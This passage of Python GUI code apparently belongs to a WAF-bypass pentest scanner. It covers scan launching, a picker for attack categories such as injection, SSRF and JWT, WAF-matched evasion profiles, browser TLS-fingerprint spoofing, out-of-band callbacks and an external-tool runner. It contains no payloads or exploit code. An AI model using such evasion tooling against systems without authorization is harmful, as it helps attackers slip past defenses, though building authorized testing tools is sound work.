                    advanced_opts = dict(advanced_opts)
                    advanced_opts['caido_proxy'] = (self._prefs or {}).get(
                        'caido_proxy_url', 'http://127.0.0.1:8080')
            except Exception:
                pass
            self._current_engagement_id = advanced_opts.get('engagement_id')
            self._worker = QtWorker(targets, threads, delay, concurrent_val, use_concurrent, retry_failed, selected_categories, proxy_config=self._proxy_config, enable_http_logging=self._enable_http_logging, enable_ssl_analysis=self._enable_ssl_analysis, advanced_opts=advanced_opts)
            self._worker_thread = QtCore.QThread()
            self._worker.moveToThread(self._worker_thread)
            self._worker.log_line.connect(self.append_log, QtCore.Qt.QueuedConnection)
            self._worker.http_log_ready.connect(self._on_http_log_ready, QtCore.Qt.QueuedConnection)
            self._worker.ssl_info_ready.connect(self._on_ssl_info_ready, QtCore.Qt.QueuedConnection)
            self._worker.target_update.connect(self._on_target_update, QtCore.Qt.QueuedConnection)
            self._worker.tmp_created.connect(self._on_tmp_created, QtCore.Qt.QueuedConnection)
            self._worker.results_emitted.connect(self._on_results_emitted, QtCore.Qt.QueuedConnection)
            self._worker.target_summary.connect(self._on_target_summary, QtCore.Qt.QueuedConnection)
            self._worker.progress_update.connect(self._update_target_progress, QtCore.Qt.QueuedConnection)
            self._worker.finished.connect(self._on_finished, QtCore.Qt.QueuedConnection)
            self._worker_thread.started.connect(self._worker.run)

            # Generate scan ID and add to database/timeline
            import uuid
            self._current_scan_id = str(uuid.uuid4())
            try:
                if self._db:
                    # Start scan record in database
                    self._db.create_scan(
                        scan_id=self._current_scan_id,
                        targets=targets,
                        settings={'threads': threads, 'delay': delay, 'concurrent': concurrent_val, 'categories': selected_categories, 'waf_detected': waf_name, 'safe_mode': advanced_opts.get('safe_mode'), 'dry_run': advanced_opts.get('dry_run')},
                        engagement_id=advanced_opts.get('engagement_id')
                    )
                    # Add timeline event for scan start
                    self._db.add_timeline_event(
                        scan_id=self._current_scan_id,
                        target=targets[0] if len(targets) == 1 else f'{len(targets)} targets',
                        event_type='scan_started',
                        event_data={'targets': targets, 'waf': waf_name,
                                    'categories': selected_categories,
                                    'engagement_id': advanced_opts.get('engagement_id'),
                                    'safe_mode': advanced_opts.get('safe_mode'),
                                    'dry_run': advanced_opts.get('dry_run')}
                    )
            except Exception:
                pass

            self._worker_thread.start()
            self.start_btn.setEnabled(False)
            self.stop_btn.setEnabled(True)
            
            # disable controls while running
            try:
                self.threads_spin.setEnabled(False)
                self.delay_spin.setEnabled(False)
            except Exception:
                pass

        def _show_scan_selection_dialog(self):
            """Show dialog for selecting scan categories. Returns list of selected category keys or None if cancelled."""
            try:
                from PySide6.QtWidgets import (QDialog, QVBoxLayout, QHBoxLayout, QScrollArea,
                                               QLabel, QPushButton, QCheckBox, QWidget, QGridLayout)
                from PySide6.QtCore import Qt
                from PySide6.QtGui import QFont, QCursor, QFontDatabase
                
                # Find a font that supports Unicode (Arabic, Cyrillic, etc.)
                try:
                    families = set(QFontDatabase.families())
                except Exception:
                    try:
                        families = set(QFontDatabase().families())
                    except Exception:
                        families = set()
                
                unicode_fonts = ["Segoe UI", "Arial", "Noto Sans", "Tahoma", "Microsoft Sans Serif", "DejaVu Sans"]
                selected_font = next((f for f in unicode_fonts if f in families), "")
                
                dialog = QDialog(self)
                dialog.setWindowTitle(_t('select_scan_types', self._lang))
                dialog.setFixedSize(1020, 320)
                dialog.setStyleSheet(f"""
                    QDialog {{ background-color: #0d1117; border: 1px solid #30363d; font-family: '{selected_font}'; }}
                    QLabel {{ color: #e6edf3; font-family: '{selected_font}'; }}
                    QCheckBox {{ 
                        color: #e6edf3; 
                        spacing: 8px;
                        padding: 6px 10px;
                        border-radius: 6px;
                        background-color: transparent;
                        font-family: '{selected_font}';
                    }}
                    QCheckBox:hover {{ background-color: #161b22; }}
                    QCheckBox::indicator {{ width: 16px; height: 16px; border-radius: 4px; }}
                    QCheckBox::indicator:unchecked {{ 
                        background-color: #21262d; 
                        border: 1px solid #30363d; 
                    }}
                    QCheckBox::indicator:checked {{ 
                        background-color: #238636; 
                        border: 1px solid #238636;
                        image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMiIgaGVpZ2h0PSIxMiIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IndoaXRlIiBzdHJva2Utd2lkdGg9IjMiPjxwb2x5bGluZSBwb2ludHM9IjIwIDYgOSAxNyA0IDEyIj48L3BvbHlsaW5lPjwvc3ZnPg==);
                    }}
                    QPushButton {{ 
                        padding: 6px 14px; 
                        font-size: 12px; 
                        font-weight: 600; 
                        border-radius: 6px;
                        border: 1px solid #30363d;
                        background-color: #21262d;
                        color: #e6edf3;
                        font-family: '{selected_font}';
                    }}
                    QPushButton:hover {{ background-color: #30363d; border-color: #8b949e; }}
                    QScrollArea {{ 
                        background-color: transparent; 
                        border: 1px solid #30363d; 
                        border-radius: 8px;
                    }}
                    QScrollArea > QWidget > QWidget {{ background-color: transparent; }}
                    QScrollBar:vertical {{
                        background-color: #0d1117;
                        width: 8px;
                        border-radius: 4px;
                    }}
                    QScrollBar::handle:vertical {{
                        background-color: #30363d;
                        border-radius: 4px;
                        min-height: 20px;
                    }}
                    QScrollBar::handle:vertical:hover {{ background-color: #484f58; }}
                    QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {{ height: 0; }}
                """)
                
                layout = QVBoxLayout(dialog)
                layout.setSpacing(12)
                layout.setContentsMargins(16, 16, 16, 16)
                
                # Header row with title and action buttons
                header_row = QHBoxLayout()
                header = QLabel(_t('select_scan_types', self._lang))
                header.setFont(QFont(selected_font, 13, QFont.Bold))
                header.setStyleSheet(f"color: #58a6ff; font-family: '{selected_font}';")
                header_row.addWidget(header)
                header_row.addStretch()
                
                select_all_btn = QPushButton(_t('select_all', self._lang))
                select_all_btn.setCursor(QCursor(Qt.PointingHandCursor))
                select_all_btn.setStyleSheet('QPushButton { background-color: #238636; border-color: #238636; color: white; } QPushButton:hover { background-color: #2ea043; }')
                deselect_all_btn = QPushButton(_t('deselect_all', self._lang))
                deselect_all_btn.setCursor(QCursor(Qt.PointingHandCursor))
                header_row.addWidget(select_all_btn)
                header_row.addWidget(deselect_all_btn)
                layout.addLayout(header_row)
                
                # Scroll area for categories
                scroll = QScrollArea()
                scroll.setWidgetResizable(True)
                scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
                
                scroll_widget = QWidget()
                scroll_widget.setStyleSheet('background-color: #0d1117;')
                grid = QGridLayout(scroll_widget)
                grid.setSpacing(4)
                grid.setContentsMargins(8, 8, 8, 8)
                
                # Store checkboxes for each category
                category_checkboxes = {}
                
                # Category icons (emoji for visual appeal)
                cat_icons = {
                    'header_manipulation': '🔧',
                    'encoding_obfuscation': '🔐',
                    'protocol_level': '📡',
                    'cache_control': '💾',
                    'injection_testing': '💉',
                    'security_misconfig': '⚙️',
                    'business_logic': '🏢',
                    'jwt_auth': '🔑',
                    'graphql_attacks': '📊',
                    'ai_attacks': '🤖',
                    'ssrf_advanced': '🌐',
                    'pdf_document': '📄',
                    'cloud_security': '☁️',
                    'advanced_payloads': '🚀',
                    'info_disclosure': '🔍',
                    'detection_recon': '🎯',
                }
                
                row, col = 0, 0
                for cat_key, cat_info in SCAN_CATEGORIES_GUI.items():
                    icon = cat_icons.get(cat_key, '•')
                    cb = QCheckBox(f"{icon}  {_t(cat_info['name_key'], self._lang)}")
                    cb.setChecked(True)
                    cb.setToolTip(cat_info['description'])
                    cb.setCursor(QCursor(Qt.PointingHandCursor))
                    cb.setFont(QFont(selected_font, 10))
                    category_checkboxes[cat_key] = cb
                    grid.addWidget(cb, row, col)
                    
                    col += 1
                    if col > 3:  # 2 columns
                        col = 0
                        row += 1
                
                grid.setRowStretch(row + 1, 1)
                scroll.setWidget(scroll_widget)
                layout.addWidget(scroll, 1)
                
                # Selected count label
                count_label = QLabel(f"✓ {len(category_checkboxes)} / {len(category_checkboxes)} selected")
                count_label.setStyleSheet('color: #8b949e; font-size: 11px;')
                
                def update_count():
                    selected = sum(1 for cb in category_checkboxes.values() if cb.isChecked())
                    count_label.setText(f"✓ {selected} / {len(category_checkboxes)} selected")
                
                for cb in category_checkboxes.values():
                    cb.stateChanged.connect(update_count)
                
                # Connect Select All / Deselect All
                def select_all():
                    for cb in category_checkboxes.values():
                        cb.setChecked(True)
                
                def deselect_all():
                    for cb in category_checkboxes.values():
                        cb.setChecked(False)
                
                select_all_btn.clicked.connect(select_all)
                deselect_all_btn.clicked.connect(deselect_all)
                
                # Evasion Profile Selector
                evasion_layout = QHBoxLayout()
                evasion_label = QLabel('🛡️ ' + (_t('evasion_profiles', self._lang) if 'evasion_profiles' in TRANSLATIONS.get(self._lang, {}) else 'Evasion Profile:'))
                evasion_label.setStyleSheet('color: #8b949e;')
                evasion_combo = QtWidgets.QComboBox()
                evasion_combo.addItem(_t('auto_select', self._lang) if 'auto_select' in TRANSLATIONS.get(self._lang, {}) else 'Auto-select based on WAF', None)
                
                # Add evasion profiles from database
                if self._db:
                    profiles = self._db.get_evasion_profiles()
                    for p in profiles:
                        evasion_combo.addItem(f"[{p.get('waf_type', 'Generic')}] {p.get('name', 'Unknown')}", p)
                
                # If we detected a WAF, pre-select the matching profile
                if hasattr(self, '_detected_waf') and self._detected_waf:
                    for i in range(evasion_combo.count()):
                        profile = evasion_combo.itemData(i)
                        if profile and profile.get('waf_type', '').lower() == self._detected_waf.lower():
                            evasion_combo.setCurrentIndex(i)
                            break
                
                evasion_layout.addWidget(evasion_label)
                evasion_layout.addWidget(evasion_combo)
                evasion_layout.addStretch()
                layout.addLayout(evasion_layout)

                # v1.6 advanced options row.
                adv = (self._prefs.get('advanced') or {}) if hasattr(self, '_prefs') else {}
                adv_layout = QHBoxLayout()
                reconfirm_chk = QCheckBox('Re-confirm findings')
                reconfirm_chk.setChecked(not adv.get('no_reconfirm', False))
                reconfirm_chk.setToolTip('Replay each bypass to demote false positives')
                safe_chk = QCheckBox('Safe mode')
                safe_chk.setChecked(bool(adv.get('safe_mode', False)))
                safe_chk.setToolTip('Skip noisy/DoS-flavored and state-changing techniques')
                impersonate_chk = QCheckBox('Impersonate browser')
                impersonate_chk.setChecked(bool(adv.get('impersonate')))
                impersonate_chk.setToolTip('Spoof a Chrome TLS (JA3/JA4) + HTTP/2 fingerprint (curl_cffi)')
                ai_triage_chk = QCheckBox('AI triage')
                ai_triage_chk.setChecked(bool(adv.get('ai_triage', False)))
                ai_triage_chk.setToolTip('Run AI false-positive triage on findings '
                                         '(needs an Anthropic API key in Settings)')
                oob_label = QLabel('OOB:')
                oob_label.setStyleSheet('color: #8b949e;')
                oob_combo = QtWidgets.QComboBox()
                oob_combo.addItem('Off', 'off')
                oob_combo.addItem('Interactsh', 'interactsh')
                oob_combo.addItem('Self-hosted', 'selfhosted')
                _oob_idx = {'off': 0, 'interactsh': 1, 'selfhosted': 2}.get(adv.get('oob', 'off'), 0)
                oob_combo.setCurrentIndex(_oob_idx)
                oob_combo.setToolTip('Confirm blind SSRF/Log4Shell/XXE via out-of-band callbacks')
                for w in (reconfirm_chk, safe_chk, impersonate_chk, ai_triage_chk):
                    w.setCursor(QCursor(Qt.PointingHandCursor))
                adv_layout.addWidget(reconfirm_chk)
                adv_layout.addWidget(safe_chk)
                adv_layout.addWidget(impersonate_chk)
                adv_layout.addWidget(ai_triage_chk)
                adv_layout.addStretch()
                adv_layout.addWidget(oob_label)
                adv_layout.addWidget(oob_combo)
                layout.addLayout(adv_layout)

                # Bottom row
                bottom_layout = QHBoxLayout()
                bottom_layout.addWidget(count_label)
                bottom_layout.addStretch()
                
                cancel_btn = QPushButton(_t('cancel', self._lang))
                cancel_btn.setCursor(QCursor(Qt.PointingHandCursor))
                cancel_btn.clicked.connect(dialog.reject)
                
                start_btn = QPushButton(f"▶  {_t('start_scan', self._lang)}")
                start_btn.setCursor(QCursor(Qt.PointingHandCursor))
                start_btn.setStyleSheet('QPushButton { background-color: #238636; border-color: #238636; color: white; padding: 8px 20px; } QPushButton:hover { background-color: #2ea043; }')
                start_btn.clicked.connect(dialog.accept)
                
                bottom_layout.addWidget(cancel_btn)
                bottom_layout.addWidget(start_btn)
                layout.addLayout(bottom_layout)
                
                # Store the evasion profile selection for use after dialog
                self._selected_evasion_profile = None
                self._pending_advanced = {}

                def on_accept():
                    self._selected_evasion_profile = evasion_combo.currentData()
                    _aiprefs = _load_prefs()
                    self._pending_advanced = {
                        'no_reconfirm': not reconfirm_chk.isChecked(),
                        'safe_mode': safe_chk.isChecked(),
                        'impersonate': 'chrome' if impersonate_chk.isChecked() else None,
                        'oob': oob_combo.currentData(),
                        'ai_triage': ai_triage_chk.isChecked(),
                        'ai_key': (_aiprefs.get('anthropic_api_key') or None),
                        'ai_model': (_aiprefs.get('ai_model') or None),
                    }
                    # Persist as defaults for next time.
                    try:
                        prefs = _load_prefs()
                        prefs['advanced'] = self._pending_advanced
                        _save_prefs(prefs)
                        self._prefs = prefs
                    except Exception:
                        pass

                dialog.accepted.connect(on_accept)
                
                # Show dialog
                if dialog.exec() == QDialog.DialogCode.Accepted:
                    selected = [key for key, cb in category_checkboxes.items() if cb.isChecked()]
                    if len(selected) == len(SCAN_CATEGORIES_GUI):
                        return []
                    return selected if selected else []
                else:
                    return None
                    
            except Exception as e:
                print(f"[!] Error showing scan selection dialog: {e}")
                return []

        def stop_scan(self):
            if self._worker:
                self._stop_requested = True
                self._worker.abort()
                # Reflect stop immediately in UI; final normalization happens in _on_finished.
                for i in range(self.tree.topLevelItemCount()):
                    it = self.tree.topLevelItem(i)
                    if 'running' in (it.text(1) or '').lower():
                        it.setText(1, 'Aborted')
            self.stop_btn.setEnabled(False)
            self.append_log('[!] ' + _t('stop_requested', self._lang))

        def _on_target_update(self, target, status, extra):
            # update tree row matching target (match by data which stores actual URL)
            for i in range(self.tree.topLevelItemCount()):
                it = self.tree.topLevelItem(i)
                item_target = it.data(0, 256) or it.text(0)
                if item_target == target:
                    if status == 'Done':
                        it.setText(1, f'Done ({extra})')
                        try:
                            it.setBackground(0, QBrush(QColor('#163f19')))
                        except Exception:
                            pass
                    elif status == 'Running':
                        it.setText(1, 'Running')
                        try:
                            it.setBackground(0, QBrush(QColor('#3b82f6')))
                        except Exception:
                            pass
                    else:
                        it.setText(1, status)
                    break
            try:
                self._update_legend_counts()
            except Exception:
                pass

        def _on_tmp_created(self, target, tmp_path):
            try:
                self._target_tmp_map[target] = tmp_path
            except Exception:
                pass
            try:
                self._tmp_result_paths.append(tmp_path)
            except Exception:
                pass
            # ensure per-target entry exists
            try:
                self._per_target_results.setdefault(target, {'done': [], 'errors': [], 'tmp': tmp_path})
                self._per_target_results[target]['tmp'] = tmp_path
            except Exception:
                pass

        def _update_legend_counts(self):
            try:
                if not getattr(self, '_legend_labels', None):
                    return
                counts = {'queued': 0, 'running': 0, 'done': 0, 'error': 0}
                for i in range(self.tree.topLevelItemCount()):
                    it = self.tree.topLevelItem(i)
                    st = (it.text(1) or '').lower()
                    if 'running' in st:
                        counts['running'] += 1
                    elif 'done' in st:
                        counts['done'] += 1
                    elif 'error' in st or '❌' in it.text(1) or 'parseerror' in st or 'noresults' in st or 'aborted' in st:
                        counts['error'] += 1
                    else:
                        counts['queued'] += 1
                mapping = {
                    'queued': _t('queued', self._lang),
                    'running': _t('running', self._lang),
                    'done': _t('done', self._lang),
                    'error': _t('error', self._lang)
                }
                for k, v in counts.items():
                    lbl = self._legend_labels.get(k)
                    if not lbl:
                        continue
                    try:
                        lbl.setText(f"{mapping.get(k, k.title())} ({v})")
                    except Exception:
                        pass
            except Exception:
                pass

        def _on_results_emitted(self, data):
            try:
                if isinstance(data, list):
                    self._results.extend(data)
                    # enable save and results buttons when we have any results
                    if self._results:
                        self.save_btn.setEnabled(True)
                        self.results_btn.setEnabled(True)
                    # Save results to database for compare feature
                    if self._db and self._current_scan_id:
                        for result in data:
                            try:
                                if getattr(self, '_current_engagement_id', None):
                                    result = dict(result)
                                    result.setdefault('engagement_id', self._current_engagement_id)
                                self._db.add_result(self._current_scan_id, result)
                            except Exception:
                                pass
                    # Live findings window: refresh whenever it exists (per-target).
                    try:
                        if getattr(self, '_live_window', None) is not None:
                            self._live_refresh()
                    except Exception:
                        pass
            except Exception:
                pass

        def show_results_summary(self):
            """Back-compat shim for my section pages: route to the Results
            page in wave1's stacked shell (the old method was removed)."""
            try:
                self._navigate('results')
            except Exception:
                pass

        def _ingest_external_findings(self, findings, label='External tool'):
            """Fold external tool / ZAP / Burp findings into the SAME results funnel
            the scanner uses. Creates a synthetic scan row if none is active so the
            results.scan_id FK is satisfied and findings both persist and appear in
            the Results Explorer (shared normalization layer, P2/P6)."""
            if not findings:
                return 0
            try:
                if self._db and not self._current_scan_id:
                    import uuid as _uuid
                    sid = str(_uuid.uuid4())
                    try:
                        self._db.create_scan(
                            scan_id=sid, targets=[label],
                            engagement_id=getattr(self, '_current_engagement_id', None))
                        self._current_scan_id = sid
                    except Exception:
                        pass
                self._on_results_emitted(findings)
                try:
                    if self._results:
                        self._start_results_pulse()
                except Exception:
                    pass
            except Exception:
                pass
            return len(findings)

        def _build_tools_page(self):
            """External pentest tools (detect-&-drive): list installed tools by
            category with status badges, run a selected one as a killable subprocess,
            and fold its findings into the Results Explorer. Absent tools show an
            install hint and are never auto-installed."""
            try:
                from .tools_registry import TOOL_CATEGORIES, tools_by_category
                from .tools_runtime import detect_all
            except Exception as e:
                QMessageBox.critical(self, 'Tools', f'Tool registry unavailable: {e}')
                return

            dlg = QtWidgets.QWidget()
            dlg.setWindowTitle('External Tools')
            dlg.resize(940, 660)
            dlg.setStyleSheet('''
                QDialog { background-color: #0f1112; }
                QLabel { color: #d7e1ea; }
                QLineEdit { background-color: #16181a; color: #d7e1ea; border: 1px solid #2b2f33; border-radius: 4px; padding: 5px; }
                QTreeWidget { background-color: #16181a; color: #d7e1ea; border: 1px solid #2b2f33; }
                QTreeWidget::item { padding: 4px; }
                QTreeWidget::item:selected { background-color: #3b82f6; }
                QPushButton { background-color: #2b2f33; color: #d7e1ea; border: none; padding: 7px 14px; border-radius: 4px; }
                QPushButton:hover { background-color: #3b3f43; }
                QPushButton:disabled { color: #6b737b; }
                QTextEdit { background-color: #0b0d0e; color: #9ee6a0; border: 1px solid #2b2f33; }
            ''')
            outer = QVBoxLayout(dlg)

            banner = QLabel('Detect-and-drive: Blackthorn runs tools already installed on this machine. '
                            'Nothing is installed for you. Authorized targets only.')
            banner.setStyleSheet('color:#8b949e; padding:2px;')
            banner.setWordWrap(True)
            outer.addWidget(banner)

            top = QHBoxLayout()
            target_edit = QLineEdit()
            try:
                target_edit.setText(self.target_edit.text().strip())
            except Exception:
                pass
            target_edit.setPlaceholderText('https://target or host')
            wordlist_edit = QLineEdit()
            wordlist_edit.setPlaceholderText('wordlist (ffuf/gobuster/feroxbuster)')
            wl_btn = QPushButton('…'); wl_btn.setFixedWidth(34)
            def pick_wl():
                p, _ = QFileDialog.getOpenFileName(dlg, 'Select wordlist')
                if p:
                    wordlist_edit.setText(p)
            wl_btn.clicked.connect(pick_wl)
            redetect_btn = QPushButton('Re-detect')
            top.addWidget(QLabel('Target:')); top.addWidget(target_edit, 3)
            top.addWidget(QLabel('Wordlist:')); top.addWidget(wordlist_edit, 2); top.addWidget(wl_btn)
            top.addWidget(redetect_btn)
            outer.addLayout(top)

            tree = QTreeWidget(); tree.setColumnCount(3)
            tree.setHeaderLabels(['Tool', 'Status', 'Version'])
            tree.setAlternatingRowColors(True)
            try:
                tree.header().setSectionResizeMode(0, QHeaderView.ResizeToContents)
                tree.header().setSectionResizeMode(2, QHeaderView.Stretch)
            except Exception:
                pass
            outer.addWidget(tree, 1)

            act = QHBoxLayout()
            run_btn = QPushButton('▶ Run selected')
            stop_btn = QPushButton('■ Stop'); stop_btn.setEnabled(False)
            cfg_btn = QPushButton('⚙ Configure')
            results_btn = QPushButton('◆ Open Results')
            act.addWidget(run_btn); act.addWidget(stop_btn); act.addWidget(cfg_btn)
            act.addStretch(); act.addWidget(results_btn)
            outer.addLayout(act)

            log = QTextEdit(); log.setReadOnly(True); log.setMaximumHeight(180)
            log.setStyleSheet('font-family: Consolas, monospace; font-size: 11px;')
            outer.addWidget(log)

            badge_color = {'ready': '#3fb950', 'needs_config': '#d29922', 'not_installed': '#8b949e'}

            def custom_paths():
                if not self._db:
                    return {}
                try:
                    return {k: v.get('custom_path') for k, v in self._db.get_all_tool_configs().items()
                            if v.get('custom_path')}
                except Exception:
                    return {}

            def populate():
                tree.clear()
                statuses = detect_all(custom_paths())
                grouped = tools_by_category()
                for cat_key, cat_name in TOOL_CATEGORIES.items():
                    specs = grouped.get(cat_key) or []
                    if not specs:
                        continue
                    parent = QTreeWidgetItem([cat_name, '', ''])
                    parent.setFont(0, QFont('', 10, QFont.Bold))
                    tree.addTopLevelItem(parent)
                    for spec in specs:
                        st = statuses.get(spec.key)
                        state = st.state if st else 'not_installed'
                        child = QTreeWidgetItem([spec.name, st.badge() if st else 'NOT INSTALLED',
                                                 (st.version or '') if st else ''])
                        child.setData(0, 256, spec.key)
                        try:
                            child.setForeground(1, QBrush(QColor(badge_color.get(state, '#8b949e'))))
                        except Exception:
                            pass
                        child.setToolTip(0, spec.install_hint or spec.homepage)
                        parent.addChild(child)
                    parent.setExpanded(True)

            def append(line):
                try:
                    log.append(str(line).rstrip())
                except Exception:
                    pass

            def selected_key():
                it = tree.currentItem()
                return it.data(0, 256) if it else None

            def run_selected():
                key = selected_key()
                if not key:
                    QMessageBox.information(dlg, 'Tools', 'Select a tool row first.')
                    return
                tgt = target_edit.text().strip()
                if not tgt:
                    QMessageBox.information(dlg, 'Tools', 'Enter a target.')
                    return
                cfg = (self._db.get_tool_config(key) if self._db else None) or {}
                extra = (cfg.get('extra_args') or '').split() or None
                wl = wordlist_edit.text().strip() or None
                self._tool_thread = QtCore.QThread()
                self._tool_worker = ToolRunWorker(key, tgt, custom_path=cfg.get('custom_path'),
                                                  extra_args=extra, api_key=cfg.get('api_key'),
                                                  wordlist=wl)
                self._tool_worker.moveToThread(self._tool_thread)
                self._tool_thread.started.connect(self._tool_worker.run)
                self._tool_worker.log_line.connect(append)

                def done(findings):
                    n = self._ingest_external_findings(findings, label=f'{key} @ {tgt}')
                    append(f'[+] Ingested {n} finding(s). Open Results to view.')
                    run_btn.setEnabled(True); stop_btn.setEnabled(False)
                    try:
                        self._tool_thread.quit(); self._tool_thread.wait(3000)
                    except Exception:
                        pass

                self._tool_worker.finished.connect(done)
                run_btn.setEnabled(False); stop_btn.setEnabled(True)
                append(f'[*] Running {key} against {tgt} …')
                self._tool_thread.start()

            def stop_running():
                try:
                    if getattr(self, '_tool_worker', None):
                        self._tool_worker.abort()
                        append('[!] Stop requested (tree-kill).')
                except Exception:
                    pass

            def configure():
                key = selected_key()
                if not key:
                    QMessageBox.information(dlg, 'Tools', 'Select a tool row first.')
                    return
                self._configure_tool_dialog(key, on_saved=populate)

            redetect_btn.clicked.connect(populate)
            run_btn.clicked.connect(run_selected)
            stop_btn.clicked.connect(stop_running)
            cfg_btn.clicked.connect(configure)
            results_btn.clicked.connect(self.show_results_summary)
            tree.itemDoubleClicked.connect(lambda *_: run_selected())
            populate()
            return dlg

        def _configure_tool_dialog(self, tool_key, on_saved=None):
            """Per-tool override editor (custom binary path / extra args / API key),
            persisted to the tool_configs table."""
            try:
                from .tools_registry import get_spec
                spec = get_spec(tool_key)
            except Exception:
                return
            cfg = (self._db.get_tool_config(tool_key) if self._db else None) or {}
            d = QtWidgets.QDialog(self)
            d.setWindowTitle(f'Configure {spec.name}')
            d.resize(560, 250)
            d.setStyleSheet('QDialog{background:#0f1112;} QLabel{color:#d7e1ea;} '
                            'QLineEdit{background:#16181a;color:#d7e1ea;border:1px solid #2b2f33;padding:5px;} '
                            'QPushButton{background:#2b2f33;color:#d7e1ea;padding:6px 12px;border-radius:4px;}')
            v = QVBoxLayout(d)
            hint = QLabel(spec.install_hint or spec.homepage or spec.name)
            hint.setWordWrap(True); hint.setStyleSheet('color:#8b949e;')
            v.addWidget(hint)
            path_edit = QLineEdit(cfg.get('custom_path') or '')
            path_edit.setPlaceholderText('custom binary path (optional)')
            row = QHBoxLayout(); browse = QPushButton('Browse')
            def pick():
                p, _ = QFileDialog.getOpenFileName(d, 'Select binary')
                if p:
                    path_edit.setText(p)
            browse.clicked.connect(pick)
            row.addWidget(path_edit); row.addWidget(browse)
            args_edit = QLineEdit(cfg.get('extra_args') or '')
            args_edit.setPlaceholderText('extra args (space-separated)')
            api_edit = QLineEdit(cfg.get('api_key') or '')
            api_edit.setPlaceholderText('API key / token (optional)')
            v.addWidget(QLabel('Binary path:')); v.addLayout(row)
            v.addWidget(QLabel('Extra args:')); v.addWidget(args_edit)
            if spec.needs_api_key:
                v.addWidget(QLabel('API key:')); v.addWidget(api_edit)
            btns = QHBoxLayout(); save = QPushButton('Save'); cancel = QPushButton('Cancel')
            btns.addStretch(); btns.addWidget(cancel); btns.addWidget(save)
            v.addLayout(btns)
            cancel.clicked.connect(d.reject)
            def do_save():
                if self._db:
                    try:
                        self._db.save_tool_config(
                            tool_key, custom_path=path_edit.text().strip() or None,
                            extra_args=args_edit.text().strip() or None,
                            api_key=api_edit.text().strip() or None, enabled=True)
                    except Exception:
                        pass
                d.accept()
                if on_saved:
                    on_saved()
            save.clicked.connect(do_save)
            d.exec()

        def _show_pipeline_builder(self):
            """Visual builder for a linear pipeline of typed stages (wafpierce_scan ->
            external_tool -> report). Runs stages sequentially as killable subprocesses,
            folding each stage's findings into the Results Explorer."""
            try:
                from .pipeline import (STAGE_TYPES, default_pipeline, validate_pipeline)
                from .tools_registry import TOOL_REGISTRY
            except Exception as e:
                QMessageBox.critical(self, 'Pipeline', f'Pipeline engine unavailable: {e}')
                return

            dlg = QtWidgets.QDialog(self)
            dlg.setWindowTitle('Pipeline Builder')
            dlg.resize(980, 720)
            dlg.setStyleSheet('''
                QDialog { background-color: #0f1112; }
                QLabel { color: #d7e1ea; }
                QLineEdit, QComboBox, QListWidget { background-color: #16181a; color: #d7e1ea; border: 1px solid #2b2f33; border-radius: 4px; padding: 5px; }
                QListWidget::item:selected { background-color: #3b82f6; }
                QPushButton { background-color: #2b2f33; color: #d7e1ea; border: none; padding: 7px 12px; border-radius: 4px; }
                QPushButton:hover { background-color: #3b3f43; }
                QPushButton:disabled { color: #6b737b; }
                QTextEdit { background-color: #0b0d0e; color: #9ee6a0; border: 1px solid #2b2f33; }
            ''')
            outer = QVBoxLayout(dlg)
            state = {'stages': []}

            row1 = QHBoxLayout()
            name_edit = QLineEdit(); name_edit.setPlaceholderText('pipeline name')
            load_combo = QtWidgets.QComboBox()
            load_btn = QPushButton('Load'); save_btn = QPushButton('Save'); del_btn = QPushButton('Delete')
            row1.addWidget(QLabel('Name:')); row1.addWidget(name_edit, 2)
            row1.addWidget(load_combo, 2); row1.addWidget(load_btn); row1.addWidget(save_btn); row1.addWidget(del_btn)
            outer.addLayout(row1)

            row2 = QHBoxLayout()
            target_edit = QLineEdit()
            try:
                target_edit.setText(self.target_edit.text().strip())
            except Exception:
                pass
            target_edit.setPlaceholderText('https://target')
            row2.addWidget(QLabel('Target:')); row2.addWidget(target_edit, 1)
            outer.addLayout(row2)

            mid = QHBoxLayout()
            stage_list = QtWidgets.QListWidget()
            mid.addWidget(stage_list, 1)
            side = QVBoxLayout()
            type_combo = QtWidgets.QComboBox()
            for k, v in STAGE_TYPES.items():
                type_combo.addItem(v, k)
            add_btn = QPushButton('+ Add stage'); edit_btn = QPushButton('Edit')
            up_btn = QPushButton('↑ Up'); down_btn = QPushButton('↓ Down'); rm_btn = QPushButton('Remove')
            for w in (type_combo, add_btn, edit_btn, up_btn, down_btn, rm_btn):
                side.addWidget(w)
            side.addStretch()
            mid.addLayout(side)
            outer.addLayout(mid, 1)

            runrow = QHBoxLayout()
            run_btn = QPushButton('▶ Run pipeline'); stop_btn = QPushButton('■ Stop'); stop_btn.setEnabled(False)
            results_btn = QPushButton('◆ Open Results')
            runrow.addWidget(run_btn); runrow.addWidget(stop_btn); runrow.addStretch(); runrow.addWidget(results_btn)
            outer.addLayout(runrow)
            log = QTextEdit(); log.setReadOnly(True); log.setMaximumHeight(200)
            log.setStyleSheet('font-family: Consolas, monospace; font-size: 11px;')
            outer.addWidget(log)

            def refresh_list():
                stage_list.clear()
                for i, s in enumerate(state['stages']):
                    cfg = s.get('config', {})
                    if s['type'] == 'external_tool':
                        summ = cfg.get('tool', '?')
                    elif s['type'] == 'report':
                        summ = cfg.get('format', 'html')
                    elif s['type'] == 'wafpierce_scan':
                        summ = ','.join(cfg.get('categories', []) or ['all'])
                    else:
                        summ = ''
                    stage_list.addItem(f"{i+1}. {STAGE_TYPES.get(s['type'], s['type'])}  [{summ}]")

            def edit_stage(s):
                t = s['type']; cfg = dict(s.get('config', {}))
                d = QtWidgets.QDialog(dlg); d.setWindowTitle(f"Configure {STAGE_TYPES.get(t, t)}"); d.resize(480, 220)
                d.setStyleSheet('QDialog{background:#0f1112;} QLabel{color:#d7e1ea;} '
                                'QLineEdit,QComboBox{background:#16181a;color:#d7e1ea;border:1px solid #2b2f33;padding:5px;} '
                                'QPushButton{background:#2b2f33;color:#d7e1ea;padding:6px 12px;border-radius:4px;}')
                v = QVBoxLayout(d); w = {}
                if t == 'wafpierce_scan':
                    v.addWidget(QLabel('Categories (comma, blank=all):'))
                    w['categories'] = QLineEdit(','.join(cfg.get('categories', []) or [])); v.addWidget(w['categories'])
                    v.addWidget(QLabel('Threads:')); w['threads'] = QLineEdit(str(cfg.get('threads', 10))); v.addWidget(w['threads'])
